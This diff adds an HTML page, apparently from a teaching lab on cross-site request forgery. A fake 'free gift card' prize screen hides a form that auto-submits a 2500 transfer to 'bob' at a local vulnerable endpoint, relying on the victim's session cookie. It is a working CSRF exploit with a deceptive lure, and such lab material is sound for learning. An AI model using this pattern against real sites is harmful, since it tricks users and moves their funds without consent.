@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>You won a prize!</title>
+<style>
+body{margin:0;min-height:100vh;display:grid;place-items:center;background:#2b1055;color:#fff;
+  font:18px/1.5 system-ui,sans-serif;text-align:center;padding:1rem}
+h1{font-size:clamp(2rem,6vw,3.5rem);margin:.2em 0}
+.spin{width:44px;height:44px;border:5px solid #ffffff44;border-top-color:#ffd166;border-radius:50%;
+  margin:1.5rem auto;animation:s 1s linear infinite}@keyframes s{to{transform:rotate(360deg)}}
+small{opacity:.7}
+@media (prefers-reduced-motion:reduce){.spin{animation:none}}
+</style></head>
+<body>
+<main>
+  <h1>You won a free gift card!</h1>
+  <p>Please wait while we confirm your prize...</p><div class="spin"></div>
+  <small>(Attacker page for the CSRF lab. Target: the VULNERABLE form.)</small>
+</main>
+
+<!-- Hidden form: the victim never sees it. The browser attaches alice's session cookie. -->
+<form id="csrf" action="http://localhost:5000/vulnerable/transfer" method="POST" hidden>
+  <input name="to" value="bob">
+  <input name="amount" value="2500">
+</form>
+<script>setTimeout(() => document.getElementById("csrf").submit(), 1500);</script>
+</body></html>
